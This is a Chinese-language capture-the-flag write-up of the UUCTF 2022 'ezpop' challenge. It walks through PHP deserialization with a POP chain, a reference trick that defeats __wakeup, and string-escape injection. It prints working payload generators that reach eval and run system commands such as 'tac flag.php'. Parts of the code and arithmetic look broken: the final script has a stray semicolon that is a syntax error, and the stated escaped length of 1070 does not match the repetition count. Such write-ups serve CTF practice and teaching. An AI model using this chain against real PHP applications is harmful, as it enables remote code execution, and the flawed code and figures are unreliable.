# UUCTF 2022 新生赛 ezpop 字符串逃逸 Writeup
> 关键词:UUCTF,2022,ezpop,字符串逃逸,反序列化,pop链,Writeup,CTF,PHP

本文详细记录了 UUCTF 2022 新生赛中 ezpop 题目的解题过程，涵盖源码分析、POP链构造、PHP 7.2 版本下的引用绕过技巧以及字符串逃逸 Payload 的完整生成思路。

## 源码审计与分析

题目提供了如下 PHP 源码，Flag 位于 `flag.php` 中：

```php
<?php
//flag in flag.php
error_reporting(0);
class UUCTF{
    public $name,$key,$basedata,$ob;
    function __construct($str){
        $this->name=$str;
    }
    function __wakeup(){
        if($this->key==="UUCTF"){
            $this->ob=unserialize(base64_decode($this->basedata));
        }
        else{
            die("oh!you should learn PHP unserialize String escape!");
        }
    }
}
class output{
    public $a;
    function __toString(){
        $this->a->rce();
    }
}
class nothing{
    public $a;
    public $b;
    public $t;
    function __wakeup(){
        $this->a="";
    }
    function __destruct(){
        $this->b=$this->t;
        die($this->a);
    }
}
class youwant{
    public $cmd;
    function rce(){
        eval($this->cmd);
    }
}
$pdata=$_POST["data"];
if(isset($pdata))
{
    $data=serialize(new UUCTF($pdata));
    $data_replace=str_replace("hacker","loveuu!",$data);
    unserialize($data_replace);
}
else{
    highlight_file(__FILE__);
}
?>
```

## 核心分析思路

### 1. 寻找注入点与 POP 链构造

通过审计代码，发现 `youwant` 类中存在 `eval($this->cmd)` 命令执行函数，这是最终的利用点。

关于如何触发并输出结果，观察到 `nothing` 类中的 `__destruct` 方法使用了 `die($this->a)`。由于 `die` 函数在 status 为字符串时会在退出前输出该字符串，这正好可以作为触发 `__toString` 魔术方法的桥梁。

由此得出完整的 POP 链：

> `youwant::rce()` → `output::__toString()` → `nothing::__destruct()`

### 2. PHP 7.2 版本下的引用绕过

在构造 POP 链时需要注意 PHP 版本问题。本题环境为 PHP 7.2.34，无法利用修改参数个数来绕过 `__wakeup`。

在 `nothing` 类中，`__wakeup` 会将 `$this->a` 置空，而 `__destruct` 中会将 `$this->t` 赋值给 `$this->b`。虽然 `$this->a` 无法直接修改，但我们可以利用 PHP 的引用机制，让 `$this->a` 和 `$this->b` 指向同一个内存地址。这样当 `__destruct` 中 `$this->b` 发生变化时，`$this->a` 也会随之改变，从而绕过 `__wakeup` 的清空操作。

### 3. 字符串逃逸机制

用户 POST 提交的 `data` 参数会先经过 `new UUCTF($pdata)` 序列化，随后执行 `str_replace("hacker","loveuu!", $data)`。

由于 `hacker`（6个字符）被替换为 `loveuu!`（7个字符），每次替换都会多出 1 个字符。利用这一特性，可以通过构造足够数量的 `hacker` 字符串，将后续原本属于序列化结构中的 `key`、`basedata` 等字段"吞掉"，从而实现字符串逃逸，注入我们自定义的序列化对象。

## Payload 构造过程

### 第一步：构造内部 POP 链序列化数据

```php
<?php
class output{
    public $a;  // 1 youwant
    function __toString(){
        $this->a->rce();
    }
}
class nothing{
    public $a;  // 2 output
    public $b;
    public $t;
    function __wakeup(){
        $this->a="";
    }
    function __destruct(){
        $this->b=$this->t;
        die($this->a);
    }
}
class youwant{
    public $cmd;  // 注入点
    function rce(){
        eval($this->cmd);
    }
}

$a = new youwant();
$a->cmd = 'system("ls");';
$b = new output();
$b->a = $a;
$c = new nothing();
$c->a = &$c->b;
$c->t = $b;
echo serialize($c);
?>
```

### 第二步：构造外层 UUCTF 序列化结构

将上一步生成的序列化数据进行 Base64 编码，并放入 `UUCTF` 类的 `basedata` 属性中。正常的序列化数据如下：

```
O:5:"UUCTF":4:{s:4:"name";N;s:3:"key";s:5:"UUCTF";s:8:"basedata";s:176:"Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oInRhYyBmbGFnLnBocCIpOyI7fX19";s:2:"ob";N;}
```

### 第三步：计算逃逸长度并拼接 Payload

我们需要逃逸的字符串为：

```
";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:176:"Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oInRhYyBmbGFnLnBocCIpOyI7fX19";s:2:"ob";N;}
```

该字符串长度为 214 个字符。由于每次 `hacker` 替换会增加 1 个字符，因此需要在 `name` 参数中放入 214 个 `hacker`。

替换后，整个序列化字符串变为：

```
{s:4:"name";s:1070:"214个hacker";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:176:"Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oInRhYyBmbGFnLnBocCIpOyI7fX19";s:2:"ob";N;}";s:3:"key";N;s:8:"basedata";N;s:2:"ob";N;}
```

此时，`name` 的值成功包含了我们注入的 `key` 和 `basedata` 字段，实现了字符串逃逸。

## 最终 Exploit 脚本

以下是完整的自动化生成 Payload 脚本：

```php
<?php
class UUCTF{
    public $name,$key,$basedata,$ob;
    function __construct($str){
        $this->name=$str;
    }
    function __wakeup(){
        if($this->key==="UUCTF"){
            $this->ob=unserialize(base64_decode($this->basedata));
        }
        else{
            die("oh!you should learn PHP unserialize String escape!");
        }
    }
}
class output{
    public $a;  // 1 youwant
    function __toString(){
        $this->a->rce();
    }
}
class nothing{
    public $a;  // 2 output
    public $b;
    public $t;
    function __wakeup(){
        $this->a="";
    }
    function __destruct(){
        $this->b=$this->t;
        die($this->a);
    }
}
class youwant{
    public $cmd;  // 注入点
    function rce(){
        eval($this->cmd);
    }
}

$a = new youwant();
$a->cmd = 'system("tac flag.php");';
$b = new output();
$b->a = $a;
$c = new nothing();
$c->a = &$c->b;
$c->t = $b;
$basedata = base64_encode(serialize($c));

echo strlen($basedata);
echo "\n";

$post='";s:3:"key";s:5:"UUCTF";s:8:"basedata";s:'.strlen($basedata).':"';.$basedata.'";s:2:"ob";N;}';
for($i=0;$i<strlen($post);$i++){
  $hacker=$hacker.'hacker';
}
echo $hacker.$post;
?>
```

## 总结

本题综合考察了 PHP 反序列化中的 POP 链构造、PHP 7.2 环境下的引用绕过技巧以及基于字符替换的字符串逃逸漏洞，整体设计较为新颖，具有一定的难度和练习价值。
